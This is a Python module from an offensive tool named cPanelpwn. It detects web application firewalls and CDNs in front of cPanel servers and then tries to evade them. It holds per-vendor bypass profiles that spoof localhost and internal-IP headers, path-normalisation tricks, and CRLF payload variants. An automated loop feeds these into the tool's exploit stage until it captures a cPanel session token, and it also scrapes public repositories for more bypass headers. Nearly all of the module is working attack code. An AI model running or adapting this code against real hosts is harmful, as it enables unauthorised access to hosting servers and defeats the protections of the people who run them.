"""Módulo cPanelpwn: waf."""

import re, json, os, threading, time
from urllib.parse import quote
from typing import Optional, Dict, List
from . import config as cfg
from .exploit import stage2_inject
from .config import C, log
from .http import _do
from .core import build_url, PAYLOAD_B64_CR, PAYLOAD_B64_LF

# ══════════════════════════════════════════════════════════════
#  DETECCIÓN WAF / CDN
# ══════════════════════════════════════════════════════════════
WAF_SIGNATURES: Dict[str, callable] = {
    "Cloudflare":  lambda r: "cf-ray" in r.headers,
    "Sucuri":      lambda r: ("x-sucuri-id" in r.headers
                              or "x-sucuri-cache" in r.headers),
    "Incapsula":   lambda r: ("x-iinfo" in r.headers
                              or "incap_ses" in r.raw_cookies.lower()
                              or "visid_incap" in r.raw_cookies.lower()),
    "Akamai":      lambda r: ("x-akamai-request-id" in r.headers
                              or "akamai" in r.headers.get("server", "").lower()),
    "AWS WAF":     lambda r: "x-amzn-waf-action" in r.headers,
    "ModSecurity": lambda r: any(x in (r.body or "").lower()
                                 for x in ("mod_security", "modsecurity")),
    "Barracuda":   lambda r: "barra_counter_session" in r.raw_cookies.lower(),
    "F5 BIG-IP":   lambda r: "bigipserver" in r.headers,
    "FortiWeb":    lambda r: "fortiwafsid" in r.raw_cookies.lower(),
    "Imperva":     lambda r: ("x-cdn" in r.headers
                              and "imperva" in r.headers.get("x-cdn","").lower()),
    # ── Additional WAFs ──────────────────────────────────────────
    "Azion":       lambda r: ("x-azion-rid" in r.headers
                              or "azion" in r.headers.get("server", "").lower()
                              or "azion" in r.headers.get("via", "").lower()),
    "Wordfence":   lambda r: ("x-fw-hash" in r.headers
                              or "wordfence_lh" in r.raw_cookies.lower()
                              or "wordfence" in (r.body or "").lower()),
    "Reblaze":     lambda r: ("x-reblaze-protection" in r.headers
                              or "rbzid" in r.raw_cookies.lower()),
    "Wallarm":     lambda r: "x-wallarm-node-uuid" in r.headers,
    "Fastly":      lambda r: ("x-fastly-request-id" in r.headers
                              or ("x-served-by" in r.headers
                                  and "cache-" in r.headers.get("x-served-by",""))),
    "Radware":     lambda r: ("x-rdwr-ip" in r.headers
                              or "rdwr" in r.raw_cookies.lower()),
    "NAXSI":       lambda r: "x-data-origin" in r.headers and (
                              r.status == 403 and "naxsi" in (r.body or "").lower()),
    "DenyAll":     lambda r: "x-denyall" in r.headers,
    # ── New WAFs ─────────────────────────────────────────────────
    "CloudFront":  lambda r: ("x-amz-cf-id"  in r.headers
                              or "x-amz-cf-pop" in r.headers),
    "BunnyCDN":    lambda r: ("bunnycdn-request-id" in r.headers
                              or "x-bunny-cached" in r.raw_cookies.lower()
                              or "bunny" in r.headers.get("server","").lower()),
    "StackPath":   lambda r: ("x-hw"     in r.headers
                              or "x-sp-pop" in r.headers
                              or "stackpath" in r.headers.get("server","").lower()),
    "Edgio":       lambda r: ("x-ec-custom-error" in r.headers
                              or "x-bap-bc"        in r.headers
                              or "edgio"      in r.headers.get("server","").lower()
                              or "limelight"  in r.headers.get("via",   "").lower()),
}

def detect_waf(scheme: str, host: str, port: int, timeout: int) -> Optional[str]:
    """Probe rápido para detectar WAF/CDN antes de rodar a cadeia de exploit."""
    url  = build_url(scheme, host, port, "/login")
    resp = _do(url, timeout=timeout, follow=False)
    if resp.status == 0:
        return None
    for name, check in WAF_SIGNATURES.items():
        try:
            if check(resp):
                return name
        except Exception:
            pass
    return None

# ══════════════════════════════════════════════════════════════
#  WAF BYPASS PROFILES
# ══════════════════════════════════════════════════════════════
# Each profile defines:
#   headers — injetados em toda request quando este WAF é detectado
#   delay   — segundos de espera entre estágios do exploit (evasão de rate-limit)
#
# Estratégia: spoof de headers IP para que o WAF trate a request como vinda
# de localhost/rede interna (comunmente na whitelist). Adicionar headers
# headers para evitar deteção de anomalias no payload Authorization: Basic.
def _mk_profile(delay: float, headers: Optional[dict] = None) -> dict:
    """Construir um perfil de bypass WAF: spoof padrão 127.0.0.1 + extras.

    Todo perfil compartilha o spoof localhost X-Forwarded-For / X-Real-IP;
    só os extras diferem por WAF. Mantiene a forma de dict consumida por
    get_bypass_headers()/get_bypass_delay(): {"headers": {...}, "delay": n}.
    """
    hdrs = {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}
    if headers:
        hdrs.update(headers)
    return {"headers": hdrs, "delay": delay}

WAF_BYPASS: Dict[str, dict] = {
    "Cloudflare": _mk_profile(0.8, {
        "CF-Connecting-IP":  "127.0.0.1",
        "Accept-Language":   "en-US,en;q=0.9",
        "Accept-Encoding":   "gzip, deflate, br",
        "Referer":           "https://www.google.com/",
        "Cache-Control":     "no-cache",
        "Pragma":            "no-cache",
    }),
    "Sucuri": _mk_profile(0.5, {
        "X-Originating-IP":  "127.0.0.1",
        "Accept-Language":   "en-US,en;q=0.9",
    }),
    "Incapsula": _mk_profile(0.5, {
        "X-Originating-IP":  "127.0.0.1",
        "X-Remote-IP":       "127.0.0.1",
        "X-Remote-Addr":     "127.0.0.1",
    }),
    "Akamai": _mk_profile(0.5, {
        "True-Client-IP":    "127.0.0.1",
        "X-True-Client-IP":  "127.0.0.1",
        "Accept-Language":   "en-US,en;q=0.9",
    }),
    "AWS WAF": _mk_profile(0.3),
    "ModSecurity": _mk_profile(0.3, {
        "X-Custom-IP-Authorization":  "127.0.0.1",
    }),
    "Imperva": _mk_profile(0.5, {
        "X-Originating-IP":  "127.0.0.1",
        "X-Remote-IP":       "127.0.0.1",
    }),
    "F5 BIG-IP": _mk_profile(0.3),
    "FortiWeb": _mk_profile(0.3),
    "Barracuda": _mk_profile(0.3),
    # ── Additional WAFs ──────────────────────────────────────────
    "Azion": _mk_profile(0.5, {
        "X-Originating-IP":  "127.0.0.1",
    }),
    "Wordfence": _mk_profile(0.3),
    "Reblaze": _mk_profile(0.5, {
        "X-Remote-IP":       "127.0.0.1",
        "X-Remote-Addr":     "127.0.0.1",
    }),
    "Wallarm": _mk_profile(0.3),
    "Fastly": _mk_profile(0.3, {
        "Fastly-Client-IP":  "127.0.0.1",
    }),
    "Radware": _mk_profile(0.3),
    "NAXSI": _mk_profile(0.3, {
        "X-Custom-IP-Authorization":  "127.0.0.1",
    }),
    "DenyAll": _mk_profile(0.3),
    # ── New WAF profiles ─────────────────────────────────────────
    "CloudFront": _mk_profile(0.5, {
        "CloudFront-Is-Desktop-Viewer":   "true",
        "CloudFront-Forwarded-Proto":     "https",
        "CloudFront-Viewer-Country":      "US",
    }),
    "BunnyCDN": _mk_profile(0.3, {
        "CDN-Loop":         "BunnyCDN",
    }),
    "StackPath": _mk_profile(0.3, {
        "X-SP-Forwarded-For": "127.0.0.1",
    }),
    "Edgio": _mk_profile(0.5, {
        "X-EC-Debug":       "x-ec-cache,x-ec-check-cacheable,x-ec-cache-key",
    }),
}

def get_bypass_headers(waf: Optional[str]) -> dict:
    """Devolve headers de bypass específicos do WAF; dict vazio se sem WAF / desconhecido."""
    if not waf:
        return {}
    return dict(WAF_BYPASS.get(waf, {}).get("headers", {}))

def get_bypass_delay(waf: Optional[str]) -> float:
    """Devolver delay entre estágios (segundos) para evasão de rate-limit."""
    if not waf:
        return 0.0
    return WAF_BYPASS.get(waf, {}).get("delay", 0.0)

# ══════════════════════════════════════════════════════════════
#  WAF BYPASS AGENT — fallback profiles + internet research
# ══════════════════════════════════════════════════════════════
# Quando o perfil de bypass principal falha, o agente percorre estes
# perfiles de técnica alternativos, depois pesquisa na internet
# técnicas adicionais específicas do WAF detectado.
#
# Each profile: {"name": str, "headers": dict, "delay": float}
#
# Techniques cover: IPv6 localhost, RFC-1918 ranges, chained X-Forwarded-For,
# Forwarded RFC-7239, browser fingerprint headers, Googlebot spoofing.

_GENERIC_FALLBACKS: List[dict] = [
    {
        "name": "IPv6 localhost",
        "headers": {
            "X-Forwarded-For":  "::1",
            "X-Real-IP":        "::1",
            "X-Originating-IP": "::1",
        },
        "delay": 0.5,
    },
    {
        "name": "RFC1918 class-A",
        "headers": {
            "X-Forwarded-For":  "10.0.0.1",
            "X-Real-IP":        "10.0.0.1",
            "X-Originating-IP": "10.0.0.1",
        },
        "delay": 0.5,
    },
    {
        "name": "RFC1918 class-B",
        "headers": {
            "X-Forwarded-For":  "172.16.0.1",
            "X-Real-IP":        "172.16.0.1",
        },
        "delay": 0.5,
    },
    {
        "name": "RFC1918 class-C",
        "headers": {
            "X-Forwarded-For":  "192.168.1.1",
            "X-Real-IP":        "192.168.1.1",
        },
        "delay": 0.5,
    },
    {
        "name": "Chained X-Forwarded-For",
        "headers": {
            "X-Forwarded-For":  "127.0.0.1, 10.0.0.1",
            "X-Real-IP":        "127.0.0.1",
            "Forwarded":        "for=127.0.0.1;proto=https",
        },
        "delay": 0.5,
    },
    {
        "name": "Forwarded RFC-7239",
        "headers": {
            "Forwarded":         "for=\"[::1]\";proto=https;by=10.0.0.1",
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.5,
    },
    {
        "name": "Full browser fingerprint",
        "headers": {
            "X-Forwarded-For":        "127.0.0.1",
            "X-Real-IP":              "127.0.0.1",
            "Accept":                 "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":        "en-US,en;q=0.9,pt-BR;q=0.8",
            "Accept-Encoding":        "gzip, deflate, br",
            "Referer":                "https://www.google.com/",
            "Cache-Control":          "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest":         "document",
            "Sec-Fetch-Mode":         "navigate",
            "Sec-Fetch-Site":         "none",
            "Sec-Fetch-User":         "?1",
        },
        "delay": 0.8,
    },
    {
        "name": "Googlebot spoof",
        "headers": {
            "X-Forwarded-For": "66.249.66.1",
            "X-Real-IP":       "66.249.66.1",
        },
        "delay": 1.0,
    },
    {
        "name": "All-headers shotgun",
        "headers": {
            "X-Forwarded-For":           "127.0.0.1",
            "X-Real-IP":                 "127.0.0.1",
            "X-Originating-IP":          "127.0.0.1",
            "X-Remote-IP":               "127.0.0.1",
            "X-Remote-Addr":             "127.0.0.1",
            "X-Client-IP":               "127.0.0.1",
            "X-Host":                    "127.0.0.1",
            "X-Forwarded-Host":          "127.0.0.1",
            "X-ProxyUser-Ip":            "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-True-Client-IP":          "127.0.0.1",
            "CF-Connecting-IP":          "127.0.0.1",
            "True-Client-IP":            "127.0.0.1",
            "Fastly-Client-IP":          "127.0.0.1",
            "Forwarded":                 "for=127.0.0.1;proto=https",
        },
        "delay": 1.0,
    },
    # ── New generic bypass techniques ────────────────────────────
    {
        "name": "HTTP verb override",
        "headers": {
            "X-Forwarded-For":        "127.0.0.1",
            "X-Real-IP":              "127.0.0.1",
            "X-HTTP-Method-Override": "GET",
            "X-Method-Override":      "GET",
            "X-Original-Method":      "GET",
        },
        "delay": 0.5,
    },
    {
        "name": "Content-Type GET bypass",
        "headers": {
            "X-Forwarded-For":  "127.0.0.1",
            "X-Real-IP":        "127.0.0.1",
            "Content-Type":     "application/x-www-form-urlencoded",
            "Content-Length":   "0",
        },
        "delay": 0.5,
    },
    {
        "name": "Chrome UA spoof",
        "headers": {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
            "User-Agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 (KHTML, like Gecko) "
                                "Chrome/124.0.0.0 Safari/537.36"),
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer":         "https://www.google.com/",
        },
        "delay": 0.5,
    },
    {
        "name": "Firefox UA spoof",
        "headers": {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
            "User-Agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
                                "Gecko/20100101 Firefox/125.0"),
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "delay": 0.5,
    },
]

# Fallbacks extras por WAF, anexados depois da lista genérica
_WAF_EXTRA_FALLBACKS: Dict[str, List[dict]] = {
    "Cloudflare": [
        {
            "name": "CF-Connecting-IP IPv6",
            "headers": {
                "CF-Connecting-IP": "::1",
                "X-Forwarded-For":  "::1",
                "X-Real-IP":        "::1",
            },
            "delay": 1.0,
        },
        {
            "name": "CF-Worker spoof",
            "headers": {
                "CF-Connecting-IP":   "127.0.0.1",
                "CF-Worker":          "cPanelpwn",
                "X-Forwarded-For":    "127.0.0.1",
                "X-Forwarded-Proto":  "https",
            },
            "delay": 1.0,
        },
    ],
    "Akamai": [
        {
            "name": "Akamai True-Client-IP IPv6",
            "headers": {
                "True-Client-IP":    "::1",
                "X-True-Client-IP":  "::1",
                "X-Forwarded-For":   "::1",
            },
            "delay": 0.8,
        },
    ],
    "Sucuri": [
        {
            "name": "Sucuri whitelist headers",
            "headers": {
                "X-Forwarded-For":  "127.0.0.1",
                "X-Sucuri-Debug":   "0",
                "X-Real-IP":        "127.0.0.1",
                "X-Sucuri-Cache":   "MISS",
            },
            "delay": 0.5,
        },
    ],
    "AWS WAF": [
        {
            "name": "AWS internal header",
            "headers": {
                "X-Forwarded-For":     "127.0.0.1",
                "X-Amzn-Trace-Id":     "Root=1-00000000-000000000000000000000000",
                "X-Forwarded-Proto":   "https",
                "X-Forwarded-Port":    "443",
            },
            "delay": 0.5,
        },
    ],
    "Azion": [
        {
            "name": "Azion edge spoof",
            "headers": {
                "X-Forwarded-For":  "127.0.0.1",
                "X-Real-IP":        "127.0.0.1",
                "X-Azion-Debug":    "0",
            },
            "delay": 0.5,
        },
    ],
    "CloudFront": [
        {
            "name": "CloudFront viewer-country spoof",
            "headers": {
                "X-Forwarded-For":              "127.0.0.1",
                "CloudFront-Is-Mobile-Viewer":  "false",
                "CloudFront-Is-Tablet-Viewer":  "false",
                "CloudFront-Viewer-Country":    "US",
                "CloudFront-Forwarded-Proto":   "https",
            },
            "delay": 0.8,
        },
        {
            "name": "CloudFront origin-spoof",
            "headers": {
                "X-Forwarded-For":  "127.0.0.1",
                "X-Real-IP":        "127.0.0.1",
                "Via":              "1.1 cloudfront.net (CloudFront)",
                "X-Amz-Cf-Id":     "fake-cf-id-bypass",
            },
            "delay": 1.0,
        },
    ],
    "BunnyCDN": [
        {
            "name": "BunnyCDN internal edge",
            "headers": {
                "X-Forwarded-For":    "127.0.0.1",
                "X-Real-IP":          "127.0.0.1",
                "CDN-Loop":           "BunnyCDN",
                "X-Bunny-Forwarded":  "for=127.0.0.1",
            },
            "delay": 0.5,
        },
    ],
    "StackPath": [
        {
            "name": "StackPath edge-node spoof",
            "headers": {
                "X-Forwarded-For":     "127.0.0.1",
                "X-SP-Forwarded-For":  "127.0.0.1",
                "X-HW":                "1",
                "X-Real-IP":           "127.0.0.1",
            },
            "delay": 0.5,
        },
    ],
    "Edgio": [
        {
            "name": "Edgio POP spoof",
            "headers": {
                "X-Forwarded-For":  "127.0.0.1",
                "X-Real-IP":        "127.0.0.1",
                "X-EC-Debug":       "x-ec-cache",
                "Via":              "1.1 edgio.net",
            },
            "delay": 0.8,
        },
    ],
    "Fastly": [
        {
            "name": "Fastly client-IP spoof",
            "headers": {
                "Fastly-Client-IP": "127.0.0.1",
                "X-Forwarded-For":  "127.0.0.1",
                "X-Real-IP":        "127.0.0.1",
                "Fastly-Debug":     "0",
            },
            "delay": 0.5,
        },
    ],
}

# ══════════════════════════════════════════════════════════════
#  PATH NORMALIZATION BYPASS PROFILES
# ══════════════════════════════════════════════════════════════
# WAFs casam com o caminho URI literal; cpsrvd normaliza no servidor.
# Each profile carries a "path" key consumed by stage2_inject.
_PATH_FALLBACKS: List[dict] = [
    {
        "name":    "Path double-slash",
        "path":    "//",
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "Path dot-slash",
        "path":    "/./",
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "Path URL-encoded slash",
        "path":    "/%2F",
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "Path traversal",
        "path":    "/login/../",
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "Path semicolon separator",
        "path":    "/;/",
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "Path double dot-slash",
        "path":    "/../",
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
]

# ══════════════════════════════════════════════════════════════
#  ALTERNATIVE CRLF PAYLOAD PROFILES
# ══════════════════════════════════════════════════════════════
# Different line-ending variants bypass WAF signature detection on
# o valor do header Authorization: Basic.
_PAYLOAD_FALLBACKS: List[dict] = [
    {
        "name":    "Bare-CR payload (\\r only)",
        "payload": PAYLOAD_B64_CR,
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "LF-only payload (\\n only)",
        "payload": PAYLOAD_B64_LF,
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "delay":   0.5,
    },
    {
        "name":    "Bare-CR payload + shotgun headers",
        "payload": PAYLOAD_B64_CR,
        "headers": {
            "X-Forwarded-For":           "127.0.0.1",
            "X-Real-IP":                 "127.0.0.1",
            "X-Originating-IP":          "127.0.0.1",
            "CF-Connecting-IP":          "127.0.0.1",
            "True-Client-IP":            "127.0.0.1",
            "Forwarded":                 "for=127.0.0.1;proto=https",
        },
        "delay":   0.8,
    },
]

# Fontes públicas consultadas para pesquisa de bypass ao vivo
_BYPASS_RESEARCH_SOURCES: List[tuple] = [
    # PayloadsAllTheThings WAF bypass section
    ("https://raw.githubusercontent.com/swisskyrepo/"
     "PayloadsAllTheThings/master/Web%20Application%20Firewall%20Bypass/README.md"),
    # Bypass header collection
    ("https://raw.githubusercontent.com/nicowillis/"
     "WAF-Bypass/master/bypass_headers.txt"),
    # Exploit notes
    ("https://raw.githubusercontent.com/0xInfection/"
     "Awesome-WAF/master/README.md"),
]

# Padrones regex para extraer hints de bypass header:value de texto
_HDR_EXTRACT_RE = re.compile(
    r'[`"\']?(X-Forwarded-For|X-Real-IP|X-Originating-IP|X-Remote-(?:IP|Addr)|'
    r'X-Client-IP|X-ProxyUser-Ip|X-True-Client-IP|True-Client-IP|CF-Connecting-IP|'
    r'Fastly-Client-IP|X-Custom-IP-Authorization|X-Forwarded-Host|Forwarded|'
    r'X-Forwarded-Proto)[`"\']?\s*:\s*[`"\']?([0-9a-fA-F:.]+|localhost)',
    re.IGNORECASE,
)

def _parse_bypass_headers_from_doc(text: str) -> List[dict]:
    """
    Extrair headers de bypass por spoofing de IP de texto arbitrário (markdown, código fonte).
    Agrupa headers encontrados a menos de 5 linhas num perfil de técnica.
    """
    lines    = text.splitlines()
    buckets: List[dict] = []
    current  = {}
    last_hit = -10

    for i, line in enumerate(lines):
        for m in _HDR_EXTRACT_RE.finditer(line):
            name, value = m.group(1), m.group(2).strip()
            if i - last_hit > 5 and current:
                buckets.append(current)
                current = {}
            current[name] = value
            last_hit = i

    if current:
        buckets.append(current)

    # Deduplicar e devolver só perfis não triviais
    seen, results = set(), []
    for b in buckets:
        key = tuple(sorted(b.items()))
        if key not in seen and len(b) >= 1:
            seen.add(key)
            results.append(b)

    return results

def waf_internet_research(waf: str, timeout: int = 12) -> List[dict]:
    """
    Consultar fontes públicas de internet por headers de bypass WAF.
    Devolve lista de dicts de headers extraídos dessas fontes.
    Corre num thread de fundo — desenhado para não bloquear.
    Se omite por completo com --no-research (stealth / privacidade).
    """
    if cfg._NO_RESEARCH:
        log("SKIP", "[bypass-agent] Pesquisa online desativada (--no-research)")
        return []
    log("DISC", f"[bypass-agent] Investigando bypass de {C.YELLOW}{waf}{C.RESET} online...")
    collected: List[dict] = []
    seen: set = set()

    for url in _BYPASS_RESEARCH_SOURCES:
        try:
            resp = _do(url, timeout=timeout)
            if resp.status == 200 and resp.body:
                found = _parse_bypass_headers_from_doc(resp.body)
                for h in found:
                    k = tuple(sorted(h.items()))
                    if k not in seen:
                        seen.add(k)
                        collected.append(h)
                if found:
                    log("OK", f"[bypass-agent]   {url.split('/')[-1]}: "
                        f"{len(found)} header group(s)")
        except Exception as e:
            log("WARN", f"[bypass-agent]   fonte falhou: {e}")

    # Busca de código em GitHub — requiere token (env GITHUB_TOKEN).
    # A busca não autenticada devolve 401, por isso se omite em silêncio.
    gh_token = os.environ.get("GITHUB_TOKEN", "").strip()
    if gh_token:
        try:
            q = quote(f"{waf} WAF bypass X-Forwarded-For 127.0.0.1")
            gh  = f"https://api.github.com/search/code?q={q}&per_page=3"
            r2  = _do(gh, timeout=timeout,
                      extra_headers={"Accept": "application/vnd.github.v3+json",
                                     "Authorization": f"Bearer {gh_token}"})
            if r2.status == 200 and r2.body:
                data = json.loads(r2.body)
                for item in data.get("items", []):
                    snippet = item.get("text_matches", [{}])[0].get("fragment", "")
                    if snippet:
                        for h in _parse_bypass_headers_from_doc(snippet):
                            k = tuple(sorted(h.items()))
                            if k not in seen:
                                seen.add(k)
                                collected.append(h)
        except Exception:
            pass

    log("OK" if collected else "WARN",
        f"[bypass-agent] Pesquisa online: {len(collected)} técnica(s) nova(s) encontradas")
    return collected

def waf_bypass_agent(waf: str,
                     scheme: str, host: str, port: int,
                     canonical: str, session_base: str,
                     timeout: int) -> Optional[str]:
    """
    Bucle completo de tentativas de bypass. Se chama quando o stage2 falha com WAF presente.

    Orden de execução:
      1. Fallbacks de headers genéricos (13 técnicas, sem rede)
      2. Perfis extras específicos do WAF (em paralelo com a pesquisa online)
      3. Fallbacks de normalização de caminho (6 variantes URI)
      4. Fallbacks de payload CRLF alternativos (3 variantes: bare-CR, só-LF, CR+shotgun)
      5. Perfis pesquisados na internet (obtidos de fontes públicas em segundo plano)

    Devolve o token /cpsess no primeiro bypass exitoso, ou None se
    esgotam todas as técnicas.
    """
    generic    = _GENERIC_FALLBACKS
    waf_extra  = _WAF_EXTRA_FALLBACKS.get(waf, [])
    local_all  = generic + waf_extra
    total_local = len(local_all)
    total_path    = len(_PATH_FALLBACKS)
    total_payload = len(_PAYLOAD_FALLBACKS)

    log("WARN",
        f"[bypass-agent] Bypass principal falhou — provando {total_local} headers "
        f"+ {total_path} caminhos + {total_payload} payloads "
        f"+ pesquisa online ao vivo", f"{host}:{port}")

    # Iniciar pesquisa online em thread de fundo
    researched: list = []
    research_done    = threading.Event()

    def _research():
        try:
            researched.extend(waf_internet_research(waf, timeout=15))
        except Exception:
            pass
        finally:
            research_done.set()

    threading.Thread(target=_research, daemon=True, name="waf-research").start()

    def _try_profile(profile: dict, label: str) -> Optional[str]:
        name    = profile.get("name", label)
        hdrs    = profile.get("headers", {})
        delay   = profile.get("delay", 0.5)
        path    = profile.get("path",    "/")
        payload = profile.get("payload", None)
        log("INFO", f"[bypass-agent] {C.CYAN}{name}{C.RESET}")
        time.sleep(delay)
        return stage2_inject(scheme, host, port, canonical,
                             session_base, timeout,
                             waf_hdrs=hdrs, path=path, payload_b64=payload)

    # Fase 1 — técnicas baseadas em headers
    for i, profile in enumerate(local_all, 1):
        token = _try_profile(profile, f"header-profile-{i}")
        if token:
            log("OK",
                f"[bypass-agent] {C.GREEN}Bypass exitoso!{C.RESET} "
                f"technique: {profile.get('name', f'header-{i}')}")
            return token

    # Fase 2 — técnicas de normalização de caminho
    log("INFO", "[bypass-agent] Alternando para técnicas de normalização de caminho...")
    for i, profile in enumerate(_PATH_FALLBACKS, 1):
        token = _try_profile(profile, f"path-{i}")
        if token:
            log("OK",
                f"[bypass-agent] {C.GREEN}Bypass via normalização de caminho!{C.RESET} "
                f"path: {profile.get('path')}")
            return token

    # Fase 3 — técnicas de payload CRLF alternativo
    log("INFO", "[bypass-agent] Alternando para técnicas de payload alternativo...")
    for i, profile in enumerate(_PAYLOAD_FALLBACKS, 1):
        token = _try_profile(profile, f"payload-{i}")
        if token:
            log("OK",
                f"[bypass-agent] {C.GREEN}Bypass via payload alternativo!{C.RESET} "
                f"technique: {profile.get('name')}")
            return token

    # Fase 4 — esperar a pesquisa online e provar resultados
    research_done.wait(timeout=25)

    if researched:
        log("INFO",
            f"[bypass-agent] Testando {len(researched)} técnica(s) obtidas na internet...")
        for i, hdrs in enumerate(researched, 1):
            log("INFO",
                f"[bypass-agent] [net-{i}/{len(researched)}] "
                f"headers: {list(hdrs.keys())}")
            time.sleep(0.5)
            token = stage2_inject(scheme, host, port, canonical,
                                  session_base, timeout, waf_hdrs=hdrs)
            if token:
                log("OK",
                    f"[bypass-agent] {C.GREEN}Bypass via técnica investigada em internet!{C.RESET}")
                return token

    total_tried = total_local + total_path + total_payload + len(researched)
    log("WARN",
        f"[bypass-agent] Esgotadas {total_tried} técnica(s) — o WAF resistiu",
        f"{host}:{port}")
    return None

# ══════════════════════════════════════════════════════════════

